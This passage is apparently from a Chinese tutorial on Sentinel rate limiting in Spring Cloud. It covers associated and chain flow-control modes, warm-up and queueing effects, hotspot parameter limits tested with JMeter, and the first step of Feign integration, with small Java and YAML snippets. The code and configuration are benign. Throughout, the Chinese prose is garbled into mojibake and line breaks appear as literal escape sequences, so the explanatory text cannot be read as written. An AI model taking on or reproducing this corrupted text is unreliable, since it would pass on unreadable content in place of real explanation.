2.å…³è”æ¨¡å¼\n\n**å…³è”æ¨¡å¼**ï¼šç»Ÿè®¡ä¸å½“å‰èµ„æºç›¸å…³çš„å¦ä¸€ä¸ªèµ„æºè§¦å‘é˜ˆå€¼æ—¶ï¼Œå¯¹å½“å‰èµ„æºé™æµ\n\n**é…ç½®è§„åˆ™**ï¼šå½“/writeèµ„æºè®¿é—®é‡è§¦å‘é˜ˆå€¼æ—¶ï¼Œå°±ä¼šå¯¹/readèµ„æºé™æµï¼Œé¿å…å½±å“/writeèµ„æºã€‚\n\n![](https://img.jwt1399.top/img/202210102053981.png)\n\næ»¡è¶³ä¸‹é¢æ¡ä»¶å¯ä»¥ä½¿ç”¨å…³è”æ¨¡å¼ï¼š\n\n- ä¸¤ä¸ªæœ‰ç«äº‰å…³ç³»çš„èµ„æº\n- ä¸€ä¸ªä¼˜å…ˆçº§è¾ƒé«˜ï¼Œä¸€ä¸ªä¼˜å…ˆçº§è¾ƒä½\n\n**ä¾‹å¦‚**ï¼šç”¨æˆ·æ”¯ä»˜æ—¶éœ€è¦ä¿®æ”¹è®¢å•çŠ¶æ€ï¼ŒåŒæ—¶ç”¨æˆ·è¦æŸ¥è¯¢è®¢å•ã€‚æŸ¥è¯¢å’Œä¿®æ”¹æ“ä½œä¼šäº‰æŠ¢æ•°æ®åº“é”ï¼Œäº§ç”Ÿç«äº‰ã€‚ä¸šåŠ¡éœ€æ±‚æ˜¯ä¼˜å…ˆæ”¯ä»˜å’Œæ›´æ–°è®¢å•çš„ä¸šåŠ¡ï¼Œå› æ­¤å½“ä¿®æ”¹è®¢å•ä¸šåŠ¡è§¦å‘é˜ˆå€¼æ—¶ï¼Œéœ€è¦å¯¹æŸ¥è¯¢è®¢å•ä¸šåŠ¡é™æµã€‚\n\n**ç»ƒä¹ **ï¼š\n\n- åœ¨OrderControlleræ–°å»ºä¸¤ä¸ªç«¯ç‚¹ï¼š/order/queryå’Œ/order/updateï¼Œæ— éœ€å®ç°ä¸šåŠ¡\n\n- é…ç½®æµæ§è§„åˆ™ï¼Œå½“/order/updateèµ„æºè¢«è®¿é—®çš„QPSè¶…è¿‡5æ—¶ï¼Œå¯¹/order/queryè¯·æ±‚é™æµ\n\n1ï¼‰å®šä¹‰/order/queryç«¯ç‚¹ï¼Œæ¨¡æ‹Ÿè®¢å•æŸ¥è¯¢\n\n```java\n@GetMapping(\"/query\")\npublic String queryOrder() {\n    return \"æŸ¥è¯¢è®¢å•æˆåŠŸ\";\n}\n```\n\n2ï¼‰å®šä¹‰/order/updateç«¯ç‚¹ï¼Œæ¨¡æ‹Ÿè®¢å•æ›´æ–°\n\n```java\n@GetMapping(\"/update\")\npublic String updateOrder() {\n    return \"æ›´æ–°è®¢å•æˆåŠŸ\";\n}\n```\n\né‡å¯æœåŠ¡ï¼Œå³å¯æŸ¥çœ‹sentinelæ§åˆ¶å°çš„ç°‡ç‚¹é“¾è·¯\n\n3ï¼‰é…ç½®æµæ§è§„åˆ™\n\nå¯¹å“ªä¸ªç«¯ç‚¹é™æµï¼Œå°±ç‚¹å‡»å“ªä¸ªç«¯ç‚¹åé¢çš„æŒ‰é’®ã€‚æˆ‘ä»¬æ˜¯å¯¹è®¢å•æŸ¥è¯¢/order/queryé™æµï¼Œå› æ­¤ç‚¹å‡»å®ƒåé¢çš„æŒ‰é’®ï¼š\n\n![](https://img.jwt1399.top/img/202210102053322.png)\n\nåœ¨è¡¨å•ä¸­å¡«å†™æµæ§è§„åˆ™ï¼š\n\n<img src=\"https://img.jwt1399.top/img/202210102053327.png\" style=\"zoom:50%;\" />\n\n4ï¼‰åœ¨Jmeteræµ‹è¯•ï¼Œé€‰æ‹©`æµæ§æ¨¡å¼-å…³è”`ï¼š\n\n![](https://img.jwt1399.top/img/202210102056349.png)\n\nå¯ä»¥çœ‹åˆ°1000ä¸ªç”¨æˆ·ï¼Œ100ç§’ï¼Œå› æ­¤QPSä¸º10ï¼Œè¶…è¿‡äº†æˆ‘ä»¬è®¾å®šçš„é˜ˆå€¼ï¼š5\n\næŸ¥çœ‹httpè¯·æ±‚ï¼š\n\n![](https://img.jwt1399.top/img/202210102056241.png)\n\nè¯·æ±‚çš„ç›®æ ‡æ˜¯/order/updateï¼Œè¶…è¿‡é˜ˆå€¼å°±ä¼šè§¦å‘é™æµã€‚ä½†é™æµçš„ç›®æ ‡æ˜¯/order/queryï¼Œåœ¨æµè§ˆå™¨è®¿é—®ï¼Œå¯ä»¥å‘ç°ï¼š\n\n![](https://img.jwt1399.top/img/202210102056506.png)\n\n#### 3.é“¾è·¯æ¨¡å¼\n\n**é“¾è·¯æ¨¡å¼**ï¼šåªé’ˆå¯¹ä»æŒ‡å®šé“¾è·¯è®¿é—®åˆ°æœ¬èµ„æºçš„è¯·æ±‚åšç»Ÿè®¡ï¼Œåˆ¤æ–­æ˜¯å¦è¶…è¿‡é˜ˆå€¼ã€‚\n\n**é…ç½®ç¤ºä¾‹**ï¼š\n\nä¾‹å¦‚æœ‰ä¸¤æ¡è¯·æ±‚é“¾è·¯ï¼š\n\n- /test1 --> /common\n\n- /test2 --> /common\n\nå¦‚æœåªå¸Œæœ›ç»Ÿè®¡ä»/test2è¿›å…¥åˆ°/commonçš„è¯·æ±‚ï¼Œåˆ™å¯ä»¥è¿™æ ·é…ç½®ï¼š\n\n![](https://img.jwt1399.top/img/202210102100433.png)\n\n**ç»ƒä¹ **\n\n> éœ€æ±‚ï¼šæœ‰æŸ¥è¯¢è®¢å•å’Œåˆ›å»ºè®¢å•ä¸šåŠ¡ï¼Œä¸¤è€…éƒ½éœ€è¦æŸ¥è¯¢å•†å“ã€‚é’ˆå¯¹ä»æŸ¥è¯¢è®¢å•è¿›å…¥åˆ°æŸ¥è¯¢å•†å“çš„è¯·æ±‚ç»Ÿè®¡ï¼Œå¹¶è®¾ç½®é™æµã€‚\n\næ­¥éª¤ï¼š\n\n1. åœ¨OrderServiceä¸­æ·»åŠ ä¸€ä¸ªqueryGoodsæ–¹æ³•ï¼Œä¸ç”¨å®ç°ä¸šåŠ¡\n\n2. åœ¨OrderControllerä¸­ï¼Œæ”¹é€ /order/queryç«¯ç‚¹ï¼Œè°ƒç”¨OrderServiceä¸­çš„queryGoodsæ–¹æ³•\n\n3. åœ¨OrderControllerä¸­æ·»åŠ ä¸€ä¸ª/order/saveçš„ç«¯ç‚¹ï¼Œè°ƒç”¨OrderServiceçš„queryGoodsæ–¹æ³•\n\n4. ç»™queryGoodsè®¾ç½®é™æµè§„åˆ™ï¼Œä»/order/queryè¿›å…¥queryGoodsçš„æ–¹æ³•é™åˆ¶QPSå¿…é¡»å°äº2\n\nå®ç°ï¼š\n\n1ï¼‰æ·»åŠ æŸ¥è¯¢å•†å“æ–¹æ³•\n\nåœ¨order-serviceæœåŠ¡ä¸­ï¼Œç»™OrderServiceç±»æ·»åŠ ä¸€ä¸ªqueryGoodsæ–¹æ³•ï¼š\n\n```java\npublic void queryGoods(){\n    System.err.println(\"æŸ¥è¯¢å•†å“\");\n}\n```\n\n2ï¼‰æŸ¥è¯¢è®¢å•æ—¶ï¼ŒæŸ¥è¯¢å•†å“\n\nåœ¨order-serviceçš„OrderControllerä¸­ï¼Œä¿®æ”¹/order/queryç«¯ç‚¹çš„ä¸šåŠ¡é€»è¾‘ï¼š\n\n```java\n@GetMapping(\"/query\")\npublic String queryOrder() {\n    // æŸ¥è¯¢å•†å“\n    orderService.queryGoods();\n    // æŸ¥è¯¢è®¢å•\n    System.out.println(\"æŸ¥è¯¢è®¢å•\");\n    return \"æŸ¥è¯¢è®¢å•æˆåŠŸ\";\n}\n```\n\n3ï¼‰æ–°å¢è®¢å•ï¼ŒæŸ¥è¯¢å•†å“\n\nåœ¨order-serviceçš„OrderControllerä¸­ï¼Œä¿®æ”¹/order/saveç«¯ç‚¹ï¼Œæ¨¡æ‹Ÿæ–°å¢è®¢å•ï¼š\n\n```java\n@GetMapping(\"/save\")\npublic String saveOrder() {\n    // æŸ¥è¯¢å•†å“\n    orderService.queryGoods();\n    // æŸ¥è¯¢è®¢å•\n    System.err.println(\"æ–°å¢è®¢å•\");\n    return \"æ–°å¢è®¢å•æˆåŠŸ\";\n}\n```\n\n 4ï¼‰ç»™æŸ¥è¯¢å•†å“æ·»åŠ èµ„æºæ ‡è®°\n\né»˜è®¤æƒ…å†µä¸‹ï¼ŒOrderServiceä¸­çš„æ–¹æ³•æ˜¯ä¸è¢«Sentinelç›‘æ§çš„ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±é€šè¿‡æ³¨è§£æ¥æ ‡è®°è¦ç›‘æ§çš„æ–¹æ³•ã€‚\n\nç»™OrderServiceçš„queryGoodsæ–¹æ³•æ·»åŠ `@SentinelResource`æ³¨è§£ï¼š\n\n```java\n@SentinelResource(\"goods\")\npublic void queryGoods(){\n    System.err.println(\"æŸ¥è¯¢å•†å“\");\n}\n```\n\né“¾è·¯æ¨¡å¼ä¸­ï¼Œæ˜¯å¯¹ä¸åŒæ¥æºçš„ä¸¤ä¸ªé“¾è·¯åšç›‘æ§ã€‚ä½†æ˜¯sentinelé»˜è®¤ä¼šç»™è¿›å…¥SpringMVCçš„æ‰€æœ‰è¯·æ±‚åšcontextæ•´åˆï¼ˆè®¾ç½®åŒä¸€ä¸ªrootèµ„æºï¼‰ï¼Œä¼šå¯¼è‡´é“¾è·¯æ¨¡å¼å¤±æ•ˆã€‚\n\næˆ‘ä»¬éœ€è¦å…³é—­è¿™ç§å¯¹SpringMVCçš„èµ„æºèšåˆï¼Œä¿®æ”¹order-serviceæœåŠ¡çš„application.ymlæ–‡ä»¶ï¼š\n\n```yaml\nspring:\n  cloud:\n    sentinel:\n      web-context-unify: false # å…³é—­contextæ•´åˆ\n```\n\né‡å¯æœåŠ¡ï¼Œè®¿é—®/order/queryå’Œ/order/saveï¼Œå¯ä»¥æŸ¥çœ‹åˆ°sentinelçš„ç°‡ç‚¹é“¾è·¯è§„åˆ™ä¸­ï¼Œå‡ºç°äº†æ–°çš„èµ„æºï¼š\n\n<img src=\"https://img.jwt1399.top/img/202210102105976.png\" style=\"zoom:50%;\" />\n\n5ï¼‰æ·»åŠ æµæ§è§„åˆ™\n\nç‚¹å‡»goodsèµ„æºåé¢çš„æµæ§æŒ‰é’®ï¼Œåœ¨å¼¹å‡ºçš„è¡¨å•ä¸­å¡«å†™ä¸‹é¢ä¿¡æ¯ï¼š\n\n<img src=\"../images/SpringCloud-é«˜çº§ç¯‡/image-20221010210635083.png\" style=\"zoom:50%;\" />\n\nåªç»Ÿè®¡ä»/order/queryè¿›å…¥/goodsçš„èµ„æºï¼ŒQPSé˜ˆå€¼ä¸º2ï¼Œè¶…å‡ºåˆ™è¢«é™æµã€‚\n\n 6ï¼‰Jmeteræµ‹è¯•ï¼Œé€‰æ‹©`æµæ§æ¨¡å¼-é“¾è·¯`ï¼š\n\n![](https://img.jwt1399.top/img/202210102108736.png)\n\nå¯ä»¥çœ‹åˆ°è¿™é‡Œ200ä¸ªç”¨æˆ·ï¼Œ50ç§’å†…å‘å®Œï¼ŒQPSä¸º4ï¼Œè¶…è¿‡äº†æˆ‘ä»¬è®¾å®šçš„é˜ˆå€¼2ã€‚\n\n| httpè¯·æ±‚ä¸€ï¼š/order/save                              | httpè¯·æ±‚äºŒï¼š/order/query                             |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210102110676.png) | ![](https://img.jwt1399.top/img/202210102110361.png) |\n| ![](https://img.jwt1399.top/img/202210102110944.png) | ![](https://img.jwt1399.top/img/202210102110669.png) |\n\n#### 4.æ€»ç»“\n\næµæ§æ¨¡å¼æœ‰å“ªäº›ï¼Ÿ\n\n- ç›´æ¥ï¼šå¯¹å½“å‰èµ„æºé™æµ\n\n- å…³è”ï¼šé«˜ä¼˜å…ˆçº§èµ„æºè§¦å‘é˜ˆå€¼ï¼Œå¯¹ä½ä¼˜å…ˆçº§èµ„æºé™æµã€‚\n\n- é“¾è·¯ï¼šå¯¹è¯·æ±‚æ¥æºçš„é™æµ\n\n### â¹æµæ§æ•ˆæœ\n\n#### 1.ç®€ä»‹\n\nåœ¨æµæ§çš„é«˜çº§é€‰é¡¹ä¸­ï¼Œè¿˜æœ‰ä¸€ä¸ªæµæ§æ•ˆæœé€‰é¡¹ï¼š\n\næµæ§æ•ˆæœæ˜¯æŒ‡è¯·æ±‚è¾¾åˆ°æµæ§é˜ˆå€¼æ—¶åº”è¯¥é‡‡å–çš„æªæ–½ï¼ŒåŒ…æ‹¬ä¸‰ç§ï¼š\n\n- **å¿«é€Ÿå¤±è´¥**ï¼šè¾¾åˆ°é˜ˆå€¼åï¼Œæ–°çš„è¯·æ±‚ä¼šè¢«ç«‹å³æ‹’ç»å¹¶æŠ›å‡ºFlowExceptionå¼‚å¸¸ï¼Œæ˜¯é»˜è®¤çš„å¤„ç†æ–¹å¼ã€‚\n\n- **warm up**ï¼šé¢„çƒ­æ¨¡å¼ï¼Œå¯¹è¶…å‡ºé˜ˆå€¼çš„è¯·æ±‚åŒæ ·æ˜¯æ‹’ç»å¹¶æŠ›å‡ºå¼‚å¸¸ã€‚ä½†è¿™ç§æ¨¡å¼é˜ˆå€¼ä¼šåŠ¨æ€å˜åŒ–ï¼Œä»ä¸€ä¸ªè¾ƒå°å€¼é€æ¸å¢åŠ åˆ°æœ€å¤§é˜ˆå€¼ã€‚\n\n- **æ’é˜Ÿç­‰å¾…**ï¼šè®©æ‰€æœ‰çš„è¯·æ±‚æŒ‰ç…§å…ˆåæ¬¡åºæ’é˜Ÿæ‰§è¡Œï¼Œä¸¤ä¸ªè¯·æ±‚çš„é—´éš”ä¸èƒ½å°äºæŒ‡å®šæ—¶é•¿\n\n![](https://img.jwt1399.top/img/202210102117862.png)\n\n#### 2.Warm up\n\né˜ˆå€¼ä¸€èˆ¬æ˜¯ä¸€ä¸ªå¾®æœåŠ¡èƒ½æ‰¿æ‹…çš„æœ€å¤§QPSï¼Œä½†æ˜¯ä¸€ä¸ªæœåŠ¡åˆšåˆšå¯åŠ¨æ—¶ï¼Œä¸€åˆ‡èµ„æºå°šæœªåˆå§‹åŒ–ï¼ˆ**å†·å¯åŠ¨**ï¼‰ï¼Œå¦‚æœç›´æ¥å°†QPSè·‘åˆ°æœ€å¤§å€¼ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡ç¬é—´å®•æœºã€‚\n\nwarm upä¹Ÿå«**é¢„çƒ­æ¨¡å¼**ï¼Œæ˜¯åº”å¯¹æœåŠ¡å†·å¯åŠ¨çš„ä¸€ç§æ–¹æ¡ˆã€‚è¯·æ±‚é˜ˆå€¼åˆå§‹å€¼æ˜¯ `maxThreshold / coldFactor`ï¼ŒæŒç»­æŒ‡å®šæ—¶é•¿åï¼Œé€æ¸æé«˜åˆ° maxThreshold å€¼ã€‚è€Œ coldFactor çš„é»˜è®¤å€¼æ˜¯3ã€‚\n\nä¾‹å¦‚ï¼Œæˆ‘è®¾ç½®QPSçš„maxThresholdä¸º10ï¼Œé¢„çƒ­æ—¶é—´ä¸º5ç§’ï¼Œé‚£ä¹ˆåˆå§‹é˜ˆå€¼å°±æ˜¯ 10 / 3 ï¼Œä¹Ÿå°±æ˜¯3ï¼Œç„¶ååœ¨5ç§’åé€æ¸å¢é•¿åˆ°10ã€‚\n\n![](https://img.jwt1399.top/img/202210102124732.png)\n\n**ç»ƒä¹ **\n\n> éœ€æ±‚ï¼šç»™/order/{orderId}è¿™ä¸ªèµ„æºè®¾ç½®é™æµï¼Œæœ€å¤§QPSä¸º10ï¼Œåˆ©ç”¨warm upæ•ˆæœï¼Œé¢„çƒ­æ—¶é•¿ä¸º5ç§’\n\n1ï¼‰é…ç½®æµæ§è§„åˆ™ï¼š\n\n<img src=\"https://img.jwt1399.top/img/202210102126946.png\"  style=\"zoom:50%;\" />\n\n\n\n2ï¼‰Jmeteræµ‹è¯•ï¼Œé€‰æ‹©`æµæ§æ•ˆæœï¼Œwarm up`ï¼š\n\n![](https://img.jwt1399.top/img/202210102126653.png)\n\n| åˆšåˆšå¯åŠ¨æ—¶ï¼Œå¤§éƒ¨åˆ†è¯·æ±‚å¤±è´¥ï¼ŒæˆåŠŸçš„åªæœ‰3ä¸ªï¼Œè¯´æ˜QPSè¢«é™å®šåœ¨3 | éšç€æ—¶é—´æ¨ç§»ï¼ŒæˆåŠŸæ¯”ä¾‹è¶Šæ¥è¶Šé«˜                       |\n| ----------------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210102131751.png)        | ![](https://img.jwt1399.top/img/202210102131157.png) |\n| ![](https://img.jwt1399.top/img/202210102131915.png)        | ![](https://img.jwt1399.top/img/202210102131516.png) |\n\n#### 3.æ’é˜Ÿç­‰å¾…\n\nå½“è¯·æ±‚è¶…è¿‡QPSé˜ˆå€¼æ—¶ï¼Œå¿«é€Ÿå¤±è´¥å’Œwarm up ä¼šæ‹’ç»æ–°çš„è¯·æ±‚å¹¶æŠ›å‡ºå¼‚å¸¸ã€‚è€Œæ’é˜Ÿç­‰å¾…åˆ™æ˜¯è®©æ‰€æœ‰è¯·æ±‚è¿›å…¥ä¸€ä¸ªé˜Ÿåˆ—ä¸­ï¼Œç„¶åæŒ‰ç…§é˜ˆå€¼å…è®¸çš„æ—¶é—´é—´éš”ä¾æ¬¡æ‰§è¡Œã€‚åæ¥çš„è¯·æ±‚å¿…é¡»ç­‰å¾…å‰é¢æ‰§è¡Œå®Œæˆï¼Œå¦‚æœè¯·æ±‚çš„é¢„æœŸç­‰å¾…æ—¶é—´è¶…å‡ºæœ€å¤§æ—¶é•¿ï¼Œåˆ™ä¼šè¢«æ‹’ç»ã€‚\n\nä¾‹å¦‚ï¼šQPS = 5ï¼Œæ„å‘³ç€æ¯200mså¤„ç†ä¸€ä¸ªé˜Ÿåˆ—ä¸­çš„è¯·æ±‚ï¼›timeout = 2000ï¼Œæ„å‘³ç€**é¢„æœŸç­‰å¾…æ—¶é•¿**è¶…è¿‡2000msçš„è¯·æ±‚ä¼šè¢«æ‹’ç»å¹¶æŠ›å‡ºå¼‚å¸¸ã€‚\n\né‚£ä»€ä¹ˆå«åšé¢„æœŸç­‰å¾…æ—¶é•¿å‘¢ï¼Ÿæ¯”å¦‚ç°åœ¨ä¸€ä¸‹å­æ¥äº†12 ä¸ªè¯·æ±‚ï¼Œå› ä¸ºæ¯200msæ‰§è¡Œä¸€ä¸ªè¯·æ±‚ï¼Œé‚£ä¹ˆï¼š\n\n- ç¬¬6ä¸ªè¯·æ±‚çš„**é¢„æœŸç­‰å¾…æ—¶é•¿** =  200 * ï¼ˆ6 - 1ï¼‰ = 1000ms\n- ç¬¬12ä¸ªè¯·æ±‚çš„é¢„æœŸç­‰å¾…æ—¶é•¿ = 200 * ï¼ˆ12-1ï¼‰ = 2200ms\n\n**ç»ƒä¹ **\n\n> éœ€æ±‚ï¼šç»™/order/{orderId}è¿™ä¸ªèµ„æºè®¾ç½®é™æµï¼Œæœ€å¤§QPSä¸º10ï¼Œåˆ©ç”¨æ’é˜Ÿçš„æµæ§æ•ˆæœï¼Œè¶…æ—¶æ—¶é•¿è®¾ç½®ä¸º5s\n\n1ï¼‰æ·»åŠ æµæ§è§„åˆ™\n\n<img src=\"https://img.jwt1399.top/img/202210102138247.png\" style=\"zoom:50%;\" />\n\n\n\n2ï¼‰Jmeteræµ‹è¯•ï¼Œé€‰æ‹©`æµæ§æ•ˆæœï¼Œé˜Ÿåˆ—`ï¼š\n\n![](https://img.jwt1399.top/img/202210102139397.png)\n\nå¦‚æœæ˜¯ä¹‹å‰çš„ å¿«é€Ÿå¤±è´¥ã€warmupæ¨¡å¼ï¼Œè¶…å‡ºçš„è¯·æ±‚åº”è¯¥ä¼šç›´æ¥æŠ¥é”™ã€‚ä½†æ˜¯æˆ‘ä»¬çœ‹çœ‹é˜Ÿåˆ—æ¨¡å¼çš„è¿è¡Œç»“æœï¼š\n\n![](https://img.jwt1399.top/img/202210102140744.png)\n\nå…¨éƒ¨éƒ½é€šè¿‡äº†ã€‚å†å»sentinelæŸ¥çœ‹å®æ—¶ç›‘æ§çš„QPSæ›²çº¿ï¼š\n\n![](https://img.jwt1399.top/img/202210102142623.png)\n\nQPSéå¸¸å¹³æ»‘ï¼Œä¸€è‡´ä¿æŒåœ¨10ï¼Œè¶…å‡ºçš„è¯·æ±‚æ²¡æœ‰è¢«æ‹’ç»ï¼Œè€Œæ˜¯æ”¾å…¥é˜Ÿåˆ—ã€‚å› æ­¤**å“åº”æ—¶é—´**ï¼ˆç­‰å¾…æ—¶é—´ï¼‰ä¼šè¶Šæ¥è¶Šé•¿ã€‚å½“é˜Ÿåˆ—æ»¡äº†ä»¥åï¼Œæ‰ä¼šæœ‰éƒ¨åˆ†è¯·æ±‚å¤±è´¥ï¼š\n\n![](https://img.jwt1399.top/img/202210102142008.png)\n\n#### 4.æ€»ç»“\n\næµæ§æ•ˆæœæœ‰å“ªäº›ï¼Ÿ\n\n- å¿«é€Ÿå¤±è´¥ï¼šQPSè¶…è¿‡é˜ˆå€¼æ—¶ï¼Œæ‹’ç»æ–°çš„è¯·æ±‚\n\n- warm upï¼š QPSè¶…è¿‡é˜ˆå€¼æ—¶ï¼Œæ‹’ç»æ–°çš„è¯·æ±‚ï¼›QPSé˜ˆå€¼é€æ¸æå‡ï¼Œå¯ä»¥é¿å…å†·å¯åŠ¨æ—¶é«˜å¹¶å‘å¯¼è‡´æœåŠ¡å®•æœºã€‚\n\n- æ’é˜Ÿç­‰å¾…ï¼šè¯·æ±‚ä¼šè¿›å…¥é˜Ÿåˆ—ï¼ŒæŒ‰ç…§é˜ˆå€¼å…è®¸çš„æ—¶é—´é—´éš”ä¾æ¬¡æ‰§è¡Œè¯·æ±‚ï¼›å¦‚æœè¯·æ±‚é¢„æœŸç­‰å¾…æ—¶é•¿å¤§äºè¶…æ—¶æ—¶é—´ï¼Œç›´æ¥æ‹’ç»\n\n### âºçƒ­ç‚¹å‚æ•°é™æµ\n\n> ä¹‹å‰çš„é™æµæ˜¯ç»Ÿè®¡è®¿é—®æŸä¸ªèµ„æºçš„æ‰€æœ‰è¯·æ±‚ï¼Œåˆ¤æ–­æ˜¯å¦è¶…è¿‡QPSé˜ˆå€¼ã€‚\n>\n> è€Œçƒ­ç‚¹å‚æ•°é™æµæ˜¯**åˆ†åˆ«ç»Ÿè®¡å‚æ•°å€¼ç›¸åŒçš„è¯·æ±‚**ï¼Œåˆ¤æ–­æ˜¯å¦è¶…è¿‡QPSé˜ˆå€¼ã€‚\n\n#### 1.å…¨å±€å‚æ•°é™æµ\n\nä¾‹å¦‚ï¼Œä¸€ä¸ªæ ¹æ®idæŸ¥è¯¢å•†å“çš„æ¥å£ï¼š\n\n![](https://img.jwt1399.top/img/202210102155281.png)\n\nè®¿é—®/goods/{id}çš„è¯·æ±‚ä¸­ï¼Œidå‚æ•°å€¼ä¼šæœ‰å˜åŒ–ï¼Œçƒ­ç‚¹å‚æ•°é™æµä¼šæ ¹æ®å‚æ•°å€¼åˆ†åˆ«ç»Ÿè®¡QPSï¼Œç»Ÿè®¡ç»“æœï¼š\n\n![](https://img.jwt1399.top/img/202210102155180.png)\n\nå½“id=1çš„è¯·æ±‚è§¦å‘é˜ˆå€¼è¢«é™æµæ—¶ï¼Œidâ‰ 1çš„è¯·æ±‚ä¸å—å½±å“ã€‚\n\né…ç½®ç¤ºä¾‹ï¼š\n\n![](https://img.jwt1399.top/img/202210102159969.png)\n\nä»£è¡¨çš„å«ä¹‰æ˜¯ï¼šå¯¹hotè¿™ä¸ªèµ„æºçš„0å·å‚æ•°ï¼ˆç¬¬ä¸€ä¸ªå‚æ•°ï¼‰åšç»Ÿè®¡ï¼Œæ¯1ç§’**ç›¸åŒå‚æ•°å€¼**çš„è¯·æ±‚æ•°ä¸èƒ½è¶…è¿‡5\n\n#### 2.çƒ­ç‚¹å‚æ•°é™æµ\n\nåˆšæ‰çš„é…ç½®ä¸­ï¼Œå¯¹æŸ¥è¯¢å•†å“è¿™ä¸ªæ¥å£çš„æ‰€æœ‰å•†å“ä¸€è§†åŒä»ï¼ŒQPSéƒ½é™å®šä¸º5.\n\nè€Œåœ¨å®é™…å¼€å‘ä¸­ï¼Œå¯èƒ½éƒ¨åˆ†å•†å“æ˜¯çƒ­ç‚¹å•†å“ï¼Œä¾‹å¦‚ç§’æ€å•†å“ï¼Œæˆ‘ä»¬å¸Œæœ›è¿™éƒ¨åˆ†å•†å“çš„QPSé™åˆ¶ä¸å…¶å®ƒå•†å“ä¸ä¸€æ ·ã€‚é‚£å°±éœ€è¦é…ç½®çƒ­ç‚¹å‚æ•°é™æµçš„é«˜çº§é€‰é¡¹äº†ï¼š\n\n![](https://img.jwt1399.top/img/202210102159086.png)\n\nç»“åˆä¸Šä¸€ä¸ªé…ç½®ï¼Œè¿™é‡Œçš„å«ä¹‰æ˜¯å¯¹0å·çš„longç±»å‹å‚æ•°é™æµï¼Œæ¯1ç§’ç›¸åŒå‚æ•°çš„QPSä¸èƒ½è¶…è¿‡5ï¼Œæœ‰ä¸¤ä¸ªä¾‹å¤–ï¼š\n\n- å¦‚æœå‚æ•°å€¼æ˜¯100ï¼Œåˆ™æ¯1ç§’å…è®¸çš„QPSä¸º10\n\n- å¦‚æœå‚æ•°å€¼æ˜¯101ï¼Œåˆ™æ¯1ç§’å…è®¸çš„QPSä¸º15\n\n#### 3.ç»ƒä¹ \n\n> **éœ€æ±‚**ï¼šç»™/order/{orderId}è¿™ä¸ªèµ„æºæ·»åŠ çƒ­ç‚¹å‚æ•°é™æµï¼Œè§„åˆ™å¦‚ä¸‹ï¼š\n>\n> - é»˜è®¤çš„çƒ­ç‚¹å‚æ•°è§„åˆ™æ˜¯æ¯1ç§’è¯·æ±‚é‡ä¸è¶…è¿‡2\n>\n> - ç»™102è¿™ä¸ªå‚æ•°è®¾ç½®ä¾‹å¤–ï¼šæ¯1ç§’è¯·æ±‚é‡ä¸è¶…è¿‡4\n>\n> - ç»™103è¿™ä¸ªå‚æ•°è®¾ç½®ä¾‹å¤–ï¼šæ¯1ç§’è¯·æ±‚é‡ä¸è¶…è¿‡10\n\n**æ³¨æ„äº‹é¡¹**ï¼šçƒ­ç‚¹å‚æ•°é™æµå¯¹é»˜è®¤çš„SpringMVCèµ„æºæ— æ•ˆï¼Œéœ€è¦åˆ©ç”¨`@SentinelResource`æ³¨è§£æ ‡è®°èµ„æº\n\n1ï¼‰æ ‡è®°èµ„æº\n\nç»™order-serviceä¸­çš„OrderControllerä¸­çš„/order/{orderId}èµ„æºæ·»åŠ æ³¨è§£ï¼š\n\n![](https://img.jwt1399.top/img/202210102204455.png)\n\n2ï¼‰çƒ­ç‚¹å‚æ•°é™æµè§„åˆ™\n\nè®¿é—®è¯¥æ¥å£ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ ‡è®°çš„hotèµ„æºå‡ºç°äº†ï¼š\n\n![](https://img.jwt1399.top/img/202210102204840.png)\n\nè¿™é‡Œä¸è¦ç‚¹å‡»hotåé¢çš„æŒ‰é’®ï¼Œé¡µé¢æœ‰BUGï¼Œç‚¹å‡»å·¦ä¾§èœå•ä¸­**çƒ­ç‚¹è§„åˆ™**èœå•ï¼š\n\n![](https://img.jwt1399.top/img/202210102204515.png)\n\nç‚¹å‡»æ–°å¢ï¼Œå¡«å†™è¡¨å•ï¼š\n\n![](https://img.jwt1399.top/img/202210102204647.png)\n\n3ï¼‰Jmeteræµ‹è¯•ï¼Œé€‰æ‹©`çƒ­ç‚¹å‚æ•°é™æµ QPS1`ï¼š\n\n![image-20210716120754527](../images/SpringCloud-é«˜çº§ç¯‡/image-20210716120754527.png)\n\nåŒ…å«3ä¸ªhttpè¯·æ±‚ï¼š\n\n| æ™®é€šå‚æ•°ï¼ŒQPSé˜ˆå€¼ä¸º2                                 | ç»“æœ                                                 |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210102208321.png) | ![](https://img.jwt1399.top/img/202210102208371.png) |\n| **ä¾‹å¤–é¡¹ï¼ŒQPSé˜ˆå€¼ä¸º4**                               | **ç»“æœ**                                             |\n| ![](https://img.jwt1399.top/img/202210102208534.png) | ![](https://img.jwt1399.top/img/202210102208122.png) |\n| **ä¾‹å¤–é¡¹ï¼ŒQPSé˜ˆå€¼ä¸º10**                              | **ç»“æœ**                                             |\n| ![](https://img.jwt1399.top/img/202210102208460.png) | ![](https://img.jwt1399.top/img/202210102208539.png) |\n\n## â‘¢éš”ç¦»å’Œé™çº§\n\n### â¶Feignæ•´åˆSentinel\n\nSpringCloudä¸­ï¼Œå¾®æœåŠ¡è°ƒç”¨éƒ½æ˜¯é€šè¿‡Feignæ¥å®ç°çš„ï¼Œå› æ­¤åšå®¢æˆ·ç«¯ä¿æŠ¤å¿…é¡»æ•´åˆFeignå’ŒSentinelã€‚\n\nFeignæ•´åˆSentinelçš„æ­¥éª¤ï¼š\n\n- åœ¨application.ymlä¸­é…ç½®ï¼šfeign.sentienl.enable=true\n- ç»™FeignClientç¼–å†™FallbackFactoryå¹¶æ³¨å†Œä¸ºBean\n- å°†FallbackFactoryé…ç½®åˆ°FeignClient\n\n**1ï¼‰ä¿®æ”¹é…ç½®ï¼Œå¼€å¯sentinelåŠŸèƒ½**\n\nä¿®æ”¹OrderServiceçš„application.ymlæ–‡ä»¶ï¼Œå¼€å¯Feignçš„SentinelåŠŸèƒ½ï¼š\n\n```yaml\nfeign:\n  sentinel:\n    enabled: true # 